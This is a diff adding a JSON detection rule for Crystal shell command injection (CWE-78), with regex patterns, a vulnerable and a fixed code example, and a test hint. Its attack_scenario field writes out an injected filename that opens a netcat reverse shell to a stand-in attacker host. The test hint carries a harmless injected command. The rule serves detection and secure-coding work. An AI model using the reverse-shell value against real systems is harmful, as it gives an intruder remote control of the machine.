@@ -1,0 +1,32 @@
+{
+  "cwe_id": "CWE-78",
+  "name": "Crystal system()/backtick command with interpolation",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "run shell command",
+    "system call",
+    "backtick command",
+    "execute external tool",
+    "Process.run"
+  ],
+  "patterns": [
+    {
+      "lang": "crystal",
+      "confidence": "high",
+      "re": "(?i)\\bsystem\\s*\\(\\s*\"[^\"]*#\\{"
+    },
+    {
+      "lang": "crystal",
+      "confidence": "high",
+      "re": "`[^`\\n]*#\\{"
+    }
+  ],
+  "attack_scenario": "filename = \"a.tgz; nc -e /bin/sh attacker 4444\" opens a reverse shell.",
+  "negative_test_hint": ["set filename = \"a.tgz; touch /tmp/pwned\" and assert the process runs tar with that literal argument and /tmp/pwned is never created"],
+  "exemplar": {
+    "noncompliant": "system(\"tar xzf #{filename}\")",
+    "compliant": "Process.run(\"tar\", [\"xzf\", filename], shell: false)",
+    "explanation": "Kernel#system and backtick literals in Crystal always invoke a shell. String interpolation (#{...}) of user data into that literal produces classic shell command injection; Process.run with an argument array and shell: false runs the binary directly."
+  }
+}
